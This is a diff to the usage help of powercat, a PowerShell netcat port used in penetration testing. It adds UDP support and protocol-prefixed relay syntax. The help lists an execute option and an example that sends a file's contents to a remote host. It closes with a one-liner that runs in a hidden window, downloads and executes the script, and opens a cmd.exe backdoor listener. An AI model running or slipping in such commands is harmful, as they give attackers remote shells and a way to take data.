@@ -7,7 +7,8 @@ Netcat: The powershell version. (v2 compatible)
     -c    Connect to a listener.                               [String]
     -p    The port to connect to, or listen on.                [String]
     -e    Execute. (GAPING_SECURITY_HOLE)                      [String]
-    -r    Relay. Formats: "-r 10.1.1.1:443", "-r 443"          [String]
+    -r    Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
+    -u    Transfer data over UDP.                              [Switch]
     -t    Timeout option. Default: 60                          [int32]
 ### General Usage Examples:
     Listen and Connect:
@@ -22,14 +23,16 @@ Netcat: The powershell version. (v2 compatible)
         'The string I want to send' | powercat -l 443
         [IO.File]::ReadAllText('C:\inputfile') | powercat -c 10.1.1.10 443
 ### powercat Relay Examples:
-    Listener to Client Relay:
-        powercat -l -p 8000 -r 10.1.1.16:443
-    Listener to Listener Relay:
-        powercat -l -p 8000 -r 4444
-    Client to Listener Relay:
-        powercat -c 10.1.1.16 -p 443 -r 4444
-    Client to Client Relay:
-        powercat -c 10.1.1.16 -p 443 -r 10.1.1.16:3389
+    Listener to Client Relay (TCP to TCP):
+        powercat -l -p 8000 -r tcp:10.1.1.16:443
+    Listener to Listener Relay (TCP to TCP):
+        powercat -l -p 8000 -r tcp:4444
+    Client to Listener Relay (TCP to TCP):
+        powercat -c 10.1.1.16 -p 443 -r tcp:4444
+    Client to Client Relay (TCP to TCP):
+        powercat -c 10.1.1.16 -p 443 -r tcp:10.1.1.16:3389
+    Listener to Client Relay (TCP to UDP):
+        powercat -l -p 8000 -r udp:10.1.1.16:53
 ### Misc Examples:
     Download and Execute Powercat Backdoor Listener One-Liner:
         powershell -nop -w h -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe"
